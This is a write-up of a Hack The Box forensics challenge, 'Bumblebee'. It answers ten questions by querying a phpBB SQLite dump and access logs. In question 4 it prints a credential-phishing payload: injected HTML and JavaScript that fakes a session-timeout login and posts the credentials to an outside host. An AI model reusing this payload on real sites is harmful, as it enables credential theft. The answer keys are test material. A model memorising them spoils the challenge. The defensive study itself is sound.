# Bumblebee

Find the Sherlock [here.](https://app.hackthebox.com/sherlocks/Bumblebee?tab=play_sherlock)

|Difficulty|Category|
|:--------:|:------:|
|   Easy   |  DFIR  |

**Skills learned:**
* Analyzing access logs and an SQLite3 database dump to search for malicious activity

## Description
An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.

**File attachment(s):**
```text
bumblebee.zip
└── incident.tgz
    ├── access.log
    └── phpbb.sqlite3
```

### Opening the SQLite3 dump
The file `phpbb.sqlite3` is an SQLite3 database dump which needs to be opened using the tool **sqlite3**.

Install the tool using the command `sudo apt install sqlite3`, then run it using `sqlite3 [DB filename]`.

After opening the database file, use `.fullschema` to see the full list of tables and their columns. An example is shown below:
```
sqlite3 phpbb.sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .fullschema
CREATE TABLE `phpbb_acl_groups` (
  `group_id` integer  NOT NULL DEFAULT 0
,  `forum_id` integer  NOT NULL DEFAULT 0
,  `auth_option_id` integer  NOT NULL DEFAULT 0
,  `auth_role_id` integer  NOT NULL DEFAULT 0
,  `auth_setting` integer NOT NULL DEFAULT 0
);
```

## Questions
**1. What was the username of the external contractor?**

Looking through the full schema of the **phpbb dump**, we see a table named *phpbb_users*. We can use an SQL query to grab useful information on the list of users: `select username, user_ip, user_email, user_lastvisit from phpbb_users;`

The list of human users includes:
```
admin|10.255.254.2|admin@forela.co.uk|1681298759
phpbb-admin|10.255.254.2|phpbb-admin@mailinator.com|1682506869
test|10.255.254.2||1681298949
rsavage001|10.255.254.2||1681833634
apoole|10.10.0.78|apoole@contractor.net|0
apoole1|10.10.0.78|apoole1@contractor.net|1682425447
```

Grabbing the **user_lastvisit** is important here to know which of the contractor.net accounts is active.

**Answer: apoole1**

---

**2. What IP address did the contractor use to create their account?**

This answer can be found in the SQL output from question 1. We can query a user's IP address in the *user_ip* column of the *phpbb_users* table.

**Answer: 10.10.0.78**

---

**3. What is the post_id of the malicious post that the contractor made?**

To find the malicious post ID, we need to look into the *phpbb_posts* table. We can query posts by their ID and the IP address of who posted it: 
`select post_id, poster_ip from phpbb_posts;`

```
1|10.255.254.2
2|10.255.254.2
9|10.10.0.78
```

There is only one post from the contractor's IP address, so this mus tbe the malicious post.

**Answer: 9**

---

**4. What is the full URI that the credential stealer sends its data to?**

We can use another SQL query to gather more data on the malicious post in the *phpbb_posts* table: `select * from phpbb_posts where post_id=9;`

```
9|2|2|52|0|10.10.0.78|1682425042|0|1|1|1|1||Hello Everyone|<div><style>body {    z-index: 100;}.modal {    position:fixed;    top:0;    left:0;    height:100%;    width:100%;    z-index:101;    background-color:white;    opacity:1;}.modal.hidden {    visibility: hidden;}</style><script type="text/javascript">function sethidden(){    const d = new Date();    d.setTime(d.getTime() + (24*60*60*1000));    let expires = "expires="+ d.toUTCString();    document.cookie = "phpbb_token=1;" + expires + ";";    var modal = document.getElementById('zbzbz1234');    modal.classList.add("hidden");}document.addEventListener("DOMContentLoaded", function(event) {    let cookieexists = false;    let name = "phpbb_token=";    let cookies = decodeURIComponent(document.cookie);    let ca = cookies.split(';');    for(let i = 0; i < ca.length; i++)    {        let c = ca[i];        while(c.charAt(0) == ' ')        {            c = c.substring(1);        }        if(c.indexOf(name) == 0) {            cookieexists = true;        }    }    if(cookieexists){        return;    }    var modal = document.getElementById('zbzbz1234');    modal.classList.remove("hidden");});</script><iframe name="hiddenframe" id="hiddenframe" style="display:none"></iframe>    <div class="modal hidden" id="zbzbz1234" onload="shouldshow">    <div id="wrap" class="wrap">        <a id="top" class="top-anchor" accesskey="t"></a>        <div id="page-header">            <div class="headerbar" role="banner">                <div class="inner">                    <div id="site-description" class="site-description">                    <a id="logo" class="logo" href="./index.php" title="Board index"><span class="site_logo"></span></a>                    <h1>forum.forela.co.uk</h1>                    <p>Forela internal forum</p> 
```

Examing the full HTML of the post, we can search for embedded links with the term **http**. 

```html
 <h3>Session Timeout</h3> <br/><br/>                    
 <p>Your session token has timed out in order to proceed you must login again.</p>     </div></div></div>    
 <form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
```

**Answer: http://10.10.0.78/update.php**

---

**5. When did the contractor log into the forum as the administrator? (UTC)**

We can use an SQL query to find this answer, this time pivoting to the *phpbb_log* table. We can see all logs from the contractor's IP using `select * from phpbb_log where log_ip="10.10.0.78";`

```
61|0|48|0|0|0|0|10.10.0.78|1682506392|LOG_ADMIN_AUTH_SUCCESS|
62|0|48|0|0|0|0|10.10.0.78|1682506431|LOG_USERS_ADDED|a:2:{i:0;s:14:"Administrators";i:1;s:6:"apoole";}
63|0|48|0|0|0|0|10.10.0.78|1682506471|LOG_DB_BACKUP|
```

The login timestamp is saved as an epoch (1682506392). This can be converted to DD/MM/YYYY hh:mm:ss using the [EpochConverter](https://www.epochconverter.com/) tool.

The Epoch conversion gives us the date **GMT: Wednesday, April 26, 2023 10:53:12 AM**.

**Answer: 26/04/2023 10:53:12**

---

**6. In the forum there are plaintext credentials for the LDAP connection, what is the password?**

We can find the LDAP credentials inside the *phpbb_config* table, using the query `select * from phpbb_config where config_name like "%ldap%";`.

```
ldap_base_dn|OU=Forela,DC=forela,DC=local|0
ldap_email||0
ldap_password|Passw0rd1|0
ldap_port||0
ldap_server|10.10.0.11|0
ldap_uid|sAMAccountName|0
ldap_user|CN=phpbb-admin,OU=Service,OU=Forela,DC=forela,DC=local|0
ldap_user_filter||0
```

The plaintext password is found in the *ldap_password* column.

**Answer: Passw0rd1**

---

**7. What is the user agent of the Administrator user?**

To find the Administrator's user agent, we must search the **access.log** file for their IP address *10.255.254.2* (found while answering question 1).

One of the matching logs is:
```
10.255.254.2 - - [25/Apr/2023:12:08:42 +0100] "GET /adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&i=12 HTTP/1.1" 403 9412 "http://10.10.0.27/adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&i=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
```

**Answer: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36**

---

**8. What time did the contractor add themselves to the Administrator group? (UTC)**

In question 5, we queried all logs from the contractor's IP address, which included the log where they were added to the Administrator group:
`62|0|48|0|0|0|0|10.10.0.78|1682506431|LOG_USERS_ADDED|a:2:{i:0;s:14:"Administrators";`

We can convert the Epoch timestamp again using [EpochConverter](https://www.epochconverter.com/), which gives us the date **GMT: Wednesday, April 26, 2023 10:53:51 AM**.

**Answer: 26/04/2023 10:53:51**

---

**9. What time did the contractor download the database backup? (UTC)**

We can find the this log in the **access.log** file, specifically searching the logs using the term *backup*. We see a log from the contractor's IP sending a GET request to the backup:
```
10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1" 200 34707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
```

Converting from the log's time zone (+0100) will give us the time in UTC.

**Answer: 26/04/2023 11:01:38**

---

**10. What was the size in bytes of the database backup as stated by access.log?**

The same log discovered in question 9 tells us the size of the database backup in bytes, right after the `200` status code.

**Answer: 34707**
